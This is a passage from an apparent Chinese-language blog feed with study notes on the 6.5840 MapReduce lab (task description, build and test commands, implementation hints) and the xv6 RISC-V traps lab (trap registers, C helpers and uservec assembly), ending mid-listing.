    <id>http://example.com/2024/03/06/6-5840-Lab-1-MapReduce/</id>
    <published>2024-03-06T08:04:23.000Z</published>
    <updated>2024-03-07T05:49:54.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="6-5840-Lab-1-MapReduce"><a href="#6-5840-Lab-1-MapReduce" class="headerlink" title="6.5840 Lab 1: MapReduce"></a>6.5840 Lab 1: MapReduce</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在这个实验中你要实现一个<code>MapReduce</code>系统。你将实现一个<code>worker</code>进程调用程序的<code>Map</code>和<code>Reduce</code>函数，并处理文件的读写，以及一个<code>coordinator</code>进程，该进程分配任务给<code>worker</code>并处理<code>failed worker</code>。你将构建的系统与<code>MapReduce</code>论文中描述的类似。</p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p>需要配置go完成这个实验</p><p>使用git（版本控制系统）获取初始实验室软件。要了解有关git的更多信息，请查看Pro Git书籍或git用户手册。</p><p>我们为你提供了一个简单的顺序MapReduce实现，位于<code>src/main/mrsequential.go</code>。它一次运行一个map和reduce，全部在单个进程中执行。我们还提供了几个MapReduce应用程序：<code>mrapps/wc.go</code>中的单词计数，以及<code>mrapps/indexer.go</code>中的文本索引器。你可以按照以下方式顺序运行单词计数：</p><blockquote><p>其中，<code>go build -buildmode=plugin ../mrapps/wc.go</code>编译出一个go插件。go插件是一种特殊的共享库，它可以在运行时被go程序动态加载并使用。</p><p><code>wc.so</code>就是上面代码编译出的一个go插件。</p><p>在<code>mrsequential.go</code>中，<code>wc.so</code>和<code>pg*.txt</code>作为main函数的参数传入。</p><p>然后<code>wc.so</code>通过函数<code>loadPlugin</code>加载到程序中。</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ~/6.5840</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> src/main</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">go build -buildmode=plugin ../mrapps/wc.go</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">rm</span> mr-out*</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">go run mrsequential.go wc.so pg*.txt</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">more mr-out-0</span></span><br><span class="line">A 509</span><br><span class="line">ABOUT 2</span><br><span class="line">ACT 8</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><code>mrsequential.go</code>程序将其输出留在名为<code>mr-out-0</code>的文件中。输入来自于名为<code>pg-xxx.txt</code>的文本文件。</p><p>随意借用<code>mrsequential.go</code>中的代码。你也应该查看<code>mrapps/wc.go</code>以了解MapReduce应用程序代码的样子。</p><p>对于这个实验室以及所有其他实验室，我们可能会发布我们提供给你的代码的更新。为了确保你可以获取这些更新并通过<code>git pull</code>轻松合并它们，最好将我们提供的代码留在原始文件中。你可以按照实验室说明中的指示添加我们提供的代码；只是不要移动它。将你自己的新函数放在新文件中是可以的。</p><h2 id="你的任务："><a href="#你的任务：" class="headerlink" title="你的任务："></a>你的任务：</h2><p>你的任务是实现一个分布式MapReduce，由两个程序组成，协调者（coordinator）和工作者（worker）。系统中将只有一个协调者进程，以及一个或多个并行执行的工作者进程。在真实系统中，工作者会在不同的机器上运行，但对于这个实验室，你将在单一机器上运行它们所有。工作者将通过RPC与协调者通信。每个工作者进程将在循环中，向协调者请求任务，从一个或多个文件中读取任务的输入，执行任务，将任务的输出写入一个或多个文件，然后再次向协调者请求新任务。如果工作者在合理的时间内（对于这个实验室，使用十秒钟）没有完成其任务，协调者应该注意到这一点，并将相同的任务分配给不同的工作者。</p><p>我们已经给你提供了一些初始代码。协调者和工作者的“main”函数分别位于<code>main/mrcoordinator.go</code>和<code>main/mrworker.go</code>中；不要修改这些文件。你应该将你的实现放在<code>mr/coordinator.go</code>、<code>mr/worker.go</code>和<code>mr/rpc.go</code>中。</p><p>以下是如何在单词计数MapReduce应用程序上运行你的代码。首先，确保单词计数插件是最新构建的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">go build -buildmode=plugin ../mrapps/wc.go</span></span><br></pre></td></tr></table></figure><p>在文件夹<code>main</code>中，运行<code>coordinator</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">rm</span> mr-out*</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">go run mrcoordinator.go pg-*.txt</span></span><br></pre></td></tr></table></figure><p>传递给<code>mrcoordinator.go</code>的<code>pg-*.txt</code>参数是输入文件；每个文件对应一个“分片”，并且是一个Map任务的输入。</p><p>在其他终端窗口上运行<code>worker</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">go run mrworker.go wc.so</span></span><br></pre></td></tr></table></figure><p>当工作者和协调者完成后，查看<code>mr-out-*</code>中的输出。当你完成实验室任务后，输出文件的排序并集应该与顺序输出匹配，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ cat mr-out-* | sort | more</span><br><span class="line">A 509</span><br><span class="line">ABOUT 2</span><br><span class="line">ACT 8</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>我们为你提供了一个测试脚本，在<code>main/test-mr.sh</code>中。测试会检查当给定<code>pg-xxx.txt</code>文件作为输入时，<code>wc</code>和<code>indexer</code> MapReduce应用程序是否产生了正确的输出。测试还会检查你的实现是否并行运行Map和Reduce任务，以及你的实现是否能从执行任务时崩溃的工作者中恢复。</p><p>如果你现在运行测试脚本，它将会挂起，因为协调者永远不会结束：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cd</span> ~/6.5840/src/main</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">bash test-mr.sh</span></span><br><span class="line">*** Starting wc test.</span><br></pre></td></tr></table></figure><p>你可以在<code>mr/coordinator.go</code>中的<code>Done</code>函数里将<code>ret := false</code>改为<code>true</code>，这样协调者就会立即退出。然后：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">bash test-mr.sh</span></span><br><span class="line">*** Starting wc test.</span><br><span class="line">sort: No such file or directory</span><br><span class="line">cmp: EOF on mr-wc-all</span><br><span class="line">--- wc output is not the same as mr-correct-wc.txt</span><br><span class="line">--- wc test: FAIL</span><br><span class="line"><span class="meta prompt_">$</span></span><br></pre></td></tr></table></figure><p>测试脚本期望在名为<code>mr-out-X</code>的文件中看到输出，每个reduce任务一个文件。<code>mr/coordinator.go</code>和<code>mr/worker.go</code>的空实现不会生成这些文件（或者做其他任何事情），因此测试会失败。</p><p>当你完成后，测试脚本的输出应该如下所示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">bash test-mr.sh</span></span><br><span class="line">*** Starting wc test.</span><br><span class="line">--- wc test: PASS</span><br><span class="line">*** Starting indexer test.</span><br><span class="line">--- indexer test: PASS</span><br><span class="line">*** Starting map parallelism test.</span><br><span class="line">--- map parallelism test: PASS</span><br><span class="line">*** Starting reduce parallelism test.</span><br><span class="line">--- reduce parallelism test: PASS</span><br><span class="line">*** Starting job count test.</span><br><span class="line">--- job count test: PASS</span><br><span class="line">*** Starting early exit test.</span><br><span class="line">--- early exit test: PASS</span><br><span class="line">*** Starting crash test.</span><br><span class="line">--- crash test: PASS</span><br><span class="line">*** PASSED ALL TESTS</span><br><span class="line"><span class="meta prompt_">$</span></span><br></pre></td></tr></table></figure><p>你可能会看到一些来自Go RPC包的错误，看起来像这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2019/12/16 13:27:09 rpc.Register: method &quot;Done&quot; has 1 input parameters; needs exactly three</span><br></pre></td></tr></table></figure><p>忽略这些消息；将协调者注册为RPC服务器是为了检查其所有方法是否适合RPC（有3个输入）；我们知道<code>Done</code>不是通过RPC调用的。<br>另外，根据你终止工作者进程的策略，你可能会看到一些形式的错误：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2024/02/11 16:21:32 dialing:dial unix /var/tmp/5840-mr-501: connect: connection refused</span><br></pre></td></tr></table></figure><p>每次测试中看到少量这类消息是正常的；它们发生在协调者退出后，工作者无法联系到协调者RPC服务器时。</p><h3 id="一些规则："><a href="#一些规则：" class="headerlink" title="一些规则："></a>一些规则：</h3><ul><li>Map阶段应该将中间键分配到nReduce个reduce任务的桶中，其中nReduce是reduce任务的数量——这是<code>main/mrcoordinator.go</code>传递给<code>MakeCoordinator()</code>的参数。每个映射器应该为reduce任务创建nReduce个中间文件。</li><li>工作者实现应该将第X个reduce任务的输出放在文件<code>mr-out-X</code>中。</li><li><code>mr-out-X</code>文件应该包含每个Reduce函数输出的一行。该行应该使用Go的<code>&quot;%v %v&quot;</code>格式生成，调用键和值。可以在<code>main/mrsequential.go</code>中查看标有“这是正确的格式”的注释行。如果你的实现与这个格式偏差太大，测试脚本将会失败。</li><li>你可以修改<code>mr/worker.go</code>、<code>mr/coordinator.go</code>和<code>mr/rpc.go</code>。你可以临时修改其他文件进行测试，但请确保你的代码能够与原始版本一起工作；我们将使用原始版本进行测试。</li><li>工作者应该将Map输出的中间结果放在当前目录的文件中，以便你的工作者稍后可以将它们作为Reduce任务的输入读取。</li><li><code>main/mrcoordinator.go</code>期望<code>mr/coordinator.go</code>实现一个<code>Done()</code>方法，当MapReduce作业完全完成时返回true；此时，<code>mrcoordinator.go</code>将退出。</li><li>当作业完全完成时，工作者进程应该退出。实现这一点的一个简单方法是使用<code>call()</code>的返回值：如果工作者无法联系到协调者，它可以假设协调者已经因为作业完成而退出，因此工作者也可以终止。根据你的设计，你可能也会发现让协调者给工作者一个“请退出”的伪任务很有帮助。</li></ul><h3 id="一些提示："><a href="#一些提示：" class="headerlink" title="一些提示："></a>一些提示：</h3><ul><li><p>Guidance page 上有一些有关开发和调试的提示</p></li><li><p>开始的一种方法是修改<code>mr/worker.go</code>的<code>Worker()</code>，向协调员发送RPC，要求执行任务。然后修改协调员，以响应尚未启动的map任务的文件名。然后修改工作程序以读取该文件并调用应用程序Map函数，如在<code>mrsequential.go</code>中。</p></li><li><p>应用程序的Map和Reduce函数使用Go的插件包在运行时从文件加载，这些文件的名称以.so结尾。<br>如果你在<code>mr/</code>目录下更改了任何内容，你可能需要重新构建你使用的任何MapReduce插件，可以使用类似<code>go build -buildmode=plugin ../mrapps/wc.go</code>的命令。</p></li><li><p>这个实验室依赖于工作者共享文件系统。当所有工作者都在同一台机器上运行时，这很简单，但如果工作者在不同的机器上运行，则需要像GFS这样的全局文件系统。</p></li><li><p>中间文件的一个合理命名约定是<code>mr-X-Y</code>，其中X是Map任务编号，Y是reduce任务编号。</p></li><li><p>工作者的map任务代码需要一种方法将中间键&#x2F;值对存储在文件中，以便在reduce任务期间可以正确读回。一种可能性是使用Go的<code>encoding/json</code>包。将键&#x2F;值对以JSON格式写入打开的文件：</p></li><li><pre><code class="json">enc := json.NewEncoder(file)  for _, kv := ... &#123;    err := enc.Encode(&amp;kv)<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">并回读这样的文件：</span><br><span class="line"></span><br></pre></td></tr></table></figure>dec := json.NewDecoder(file)  for &#123;    var kv KeyValue    if err := dec.Decode(&amp;kv); err != nil &#123;      break    &#125;    kva = append(kva, kv)  &#125;</code></pre></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;6-5840-Lab-1-MapReduce&quot;&gt;&lt;a href=&quot;#6-5840-Lab-1-MapReduce&quot; class=&quot;headerlink&quot; title=&quot;6.5840 Lab 1: MapReduce&quot;&gt;&lt;/a&gt;6.5840 Lab 1: MapRe</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Lab: traps</title>
    <link href="http://example.com/2024/02/29/Lab-traps/"/>
    <id>http://example.com/2024/02/29/Lab-traps/</id>
    <published>2024-02-29T01:59:40.000Z</published>
    <updated>2024-03-05T11:59:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Lab-traps"><a href="#Lab-traps" class="headerlink" title="Lab: traps"></a>Lab: traps</h1><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><h3 id="4-1-RISC-V-trap-machinery"><a href="#4-1-RISC-V-trap-machinery" class="headerlink" title="4.1 RISC-V trap machinery"></a>4.1 RISC-V trap machinery</h3><ul><li><p><code>stvec</code>：内核将陷阱处理程序<code>trap handler</code>的地址写入此处；<code>RISC-V</code>跳向该地址处理陷阱<code>trap</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* defined in riscv.h */</span></span><br><span class="line"><span class="comment">// Supervisor Trap-Vector Base Address</span></span><br><span class="line"><span class="comment">// low two bits are mode.</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">w_stvec</span><span class="params">(uint64 x)</span> &#123; </span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;csrw stvec, %0&quot;</span> : : <span class="string">&quot;r&quot;</span> (x))</span>; <span class="comment">// write stvec</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> uint64 <span class="title function_">r_stvec</span><span class="params">()</span> &#123;</span><br><span class="line">  uint64 x;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;csrr %0, stvec&quot;</span> : <span class="string">&quot;=r&quot;</span> (x) )</span>;<span class="comment">// read stvec</span></span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>sepc</code>：当陷阱<code>trap</code>发生时，<code>RISC-V</code>把程序计数器<code>PC</code>的值保存在这里（因为<code>PC</code>的值将会被<code>stvec</code>中的值覆盖）。指令<code>sret (return from trap)</code>将<code>sepc</code>的值拷贝给<code>pc</code>。内核可以写入<code>sepc</code>寄存器来控制<code>sret</code>指令跳转的位置。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* defined in riscv.h */</span></span><br><span class="line"><span class="comment">// supervisor exception program counter, holds the</span></span><br><span class="line"><span class="comment">// instruction address to which a return from</span></span><br><span class="line"><span class="comment">// exception will go.</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">w_sepc</span><span class="params">(uint64 x)</span> &#123;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;csrw sepc, %0&quot;</span> : : <span class="string">&quot;r&quot;</span> (x))</span>; <span class="comment">// 写 sepc 寄存器</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> uint64 <span class="title function_">r_sepc</span><span class="params">()</span> &#123;</span><br><span class="line">  uint64 x;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;csrr %0, sepc&quot;</span> : <span class="string">&quot;=r&quot;</span> (x) )</span>; <span class="comment">// 读 sepc 寄存器</span></span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>scause</code>：<code>RISC-V</code>将描述<code>trap</code>原因的数字放在这个寄存器里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Supervisor Trap Cause</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> uint64 <span class="title function_">r_scause</span><span class="params">()</span> &#123;</span><br><span class="line">  uint64 x;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;csrr %0, scause&quot;</span> : <span class="string">&quot;=r&quot;</span> (x) )</span>;</span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>sscratch</code>：陷阱处理代码使用sscratch寄存器来避免在保存用户寄存器之前覆盖它们。</p></li><li><p><code>sstatus</code>：<code>sstatus</code>寄存器用于跟踪处理器当前的操作状态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Supervisor Status Register, sstatus</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SSTATUS_SPP (1L &lt;&lt; 8)  <span class="comment">// Previous mode, 1=Supervisor, 0=User 在trap前是什么模式</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SSTATUS_SPIE (1L &lt;&lt; 5) <span class="comment">// Supervisor Previous Interrupt Enable 之前是否启用supervisor interrupt</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SSTATUS_UPIE (1L &lt;&lt; 4) <span class="comment">// User Previous Interrupt Enable 之前是否启用user interrupt</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SSTATUS_SIE (1L &lt;&lt; 1)  <span class="comment">// Supervisor Interrupt Enable 当前是否启用supervisor interrupt</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SSTATUS_UIE (1L &lt;&lt; 0)  <span class="comment">// User Interrupt Enable 当前是否启用user interrupt</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> uint64 <span class="title function_">r_sstatus</span><span class="params">()</span> &#123;</span><br><span class="line">  uint64 x;</span><br><span class="line">  <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;csrr %0, sstatus&quot;</span> : <span class="string">&quot;=r&quot;</span> (x) )</span>;<span class="comment">// 读</span></span><br><span class="line">  <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">w_sstatus</span><span class="params">(uint64 x)</span>&#123; <span class="keyword">asm</span> <span class="title function_">volatile</span><span class="params">(<span class="string">&quot;csrw sstatus, %0&quot;</span> : : <span class="string">&quot;r&quot;</span> (x))</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// enable device interrupts 启用设备中断</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">intr_on</span><span class="params">()</span> &#123; w_sstatus(r_sstatus() | SSTATUS_SIE); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// disable device interrupts 禁止设备中断</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">intr_off</span><span class="params">()</span> &#123; w_sstatus(r_sstatus() &amp; ~SSTATUS_SIE); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// are device interrupts enabled? 判断是否启用设备中断</span></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">intr_get</span><span class="params">()</span> &#123;</span><br><span class="line">  uint64 x = r_sstatus();</span><br><span class="line">  <span class="keyword">return</span> (x &amp; SSTATUS_SIE) != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>上述寄存器和陷阱处理函数<code>trap handler</code>相关，不能在用户态中读取或写入。</p><p>当需要强制陷阱时，RISC-V硬件对所有陷阱类型（计时器中断除外）进行以下操作：</p><ol><li>如果<code>trap</code>类型是设备中断，且<code>sstatus</code>的<code>SIE</code>位为<code>0</code>，则什么都不做。</li><li>通过置<code>sstatus</code>的<code>SIE</code>位为<code>0</code>禁用所有中断。</li><li>将<code>pc</code>的值复制到<code>sepc</code>中。</li><li>将当前模式<code>user or supervisor</code>保存到<code>sstatus</code>中的<code>SSP</code>位。</li><li><code>scause</code>中保存导致陷阱<code>trap</code>的原因。</li><li>更改模式为监管<code>supervisor mode</code>。</li><li>复制<code>stvec</code>的值到<code>pc</code>。</li><li>从新的<code>pc</code>处执行程序。</li></ol><h3 id="4-2-Trap-from-user-space"><a href="#4-2-Trap-from-user-space" class="headerlink" title="4.2 Trap from user space"></a>4.2 Trap from user space</h3><p>当用户程序执行系统调用（ecall指令）、进行非法操作或设备中断时，可能会在用户空间执行时发生陷阱。用户空间陷阱的处理路径是首先通过uservec（位于kernel&#x2F;trampoline.S:21），然后是usertrap（位于kernel&#x2F;trap.c:37）；在返回时，通过usertrapret（位于kernel&#x2F;trap.c:90）然后是userret（位于kernel&#x2F;trampoline.S:101）。</p><ul><li><p><code>uservec</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">.section trampsec</span><br><span class="line">.globl trampoline</span><br><span class="line">.globl usertrap</span><br><span class="line">trampoline:</span><br><span class="line">.align 4</span><br><span class="line">.globl uservec</span><br><span class="line">uservec:    </span><br><span class="line">#</span><br><span class="line">        # trap.c sets stvec to point here, so</span><br><span class="line">        # traps from user space start here,</span><br><span class="line">        # in supervisor mode, but with a</span><br><span class="line">        # user page table.</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">        # save user a0 in sscratch so</span><br><span class="line">        # a0 can be used to get at TRAPFRAME.</span><br><span class="line">        csrw sscratch, a0 // 将 a0 寄存器的值存储到 sscratch 寄存器中，也就是0x3f ffff e000</span><br><span class="line"></span><br><span class="line">        # each process has a separate p-&gt;trapframe memory area,</span><br><span class="line">        # but it&#x27;s mapped to the same virtual address</span><br><span class="line">        # (TRAPFRAME) in every process&#x27;s user page table.</span><br><span class="line">        li a0, TRAPFRAME # 这里开始 a0 指向 TRAPFRAME </span><br><span class="line">        </span><br><span class="line">        # save the user registers in TRAPFRAME 每个寄存器占8字节</span><br><span class="line">        sd ra, 40(a0)</span><br><span class="line">        sd sp, 48(a0)</span><br><span class="line">        sd gp, 56(a0)</span><br><span class="line">        sd tp, 64(a0)</span><br><span class="line">        sd t0, 72(a0)</span><br><span class="line">        sd t1, 80(a0)</span><br><span class="line">        sd t2, 88(a0)</span><br><span class="line">        sd s0, 96(a0)</span><br><span class="line">        sd s1, 104(a0)</span><br><span class="line">        sd a1, 120(a0)</span><br><span class="line">        sd a2, 128(a0)</span><br><span class="line">        sd a3, 136(a0)</span><br><span class="line">        sd a4, 144(a0)</span><br><span class="line">        sd a5, 152(a0)</span><br><span class="line">        sd a6, 160(a0)</span><br><span class="line">        sd a7, 168(a0)</span><br><span class="line">        sd s2, 176(a0)</span><br><span class="line">        sd s3, 184(a0)</span><br><span class="line">        sd s4, 192(a0)</span><br><span class="line">        sd s5, 200(a0)</span><br><span class="line">        sd s6, 208(a0)</span><br><span class="line">        sd s7, 216(a0)</span><br><span class="line">        sd s8, 224(a0)</span><br><span class="line">        sd s9, 232(a0)</span><br><span class="line">        sd s10, 240(a0)</span><br><span class="line">        sd s11, 248(a0)</span><br><span class="line">        sd t3, 256(a0)</span><br><span class="line">        sd t4, 264(a0)</span><br><span class="line">        sd t5, 272(a0)</span><br><span class="line">        sd t6, 280(a0)</span><br><span class="line"></span><br><span class="line"># save the user a0 in p-&gt;trapframe-&gt;a0</span><br><span class="line">        csrr t0, sscratch</span><br><span class="line">        sd t0, 112(a0) # 将 t0 寄存器的值存储到 a0 寄存器指向的偏移量为 112 字节的位置</span><br><span class="line"></span><br><span class="line">        # initialize kernel stack pointer, from p-&gt;trapframe-&gt;kernel_sp</span><br><span class="line">        ld sp, 8(a0) # 将 a0 寄存器指向的地址加上8字节偏移后的内存位置的内容加载到栈指针sp寄存器中</span><br><span class="line">        # a0 寄存器指向的地址加上8字节偏移后的内存位置就是 内核栈指针</span><br><span class="line"></span><br><span class="line">        # make tp hold the current hartid, from p-&gt;trapframe-&gt;kernel_hartid</span><br><span class="line">        ld tp, 32(a0)</span><br><span class="line"></span><br><span class="line">        # load the address of usertrap(), from p-&gt;trapframe-&gt;kernel_trap</span><br><span class="line">        ld t0, 16(a0) # t0 指向 usertrap() 的地址</span><br><span class="line"></span><br><span class="line">        # fetch the kernel page table address, from p-&gt;trapframe-&gt;kernel_satp.</span><br><span class="line">        ld t1, 0(a0) # </span><br><span class="line"></span><br><span class="line">        # wait for any previous memory operations to complete, so that</span><br><span class="line">        # they use the user page table.</span><br><span class="line">        sfence.vma zero, zero</span><br><span class="line"></span><br><span class="line">        # install the kernel page table.</span><br><span class="line">        csrw satp, t1</span><br><span class="line"></span><br><span class="line">        # flush now-stale user entries from the TLB.</span><br><span class="line">        sfence.vma zero, zero</span><br><span class="line"></span><br><span class="line">        # jump to usertrap(), which does not return</span><br><span class="line">        jr 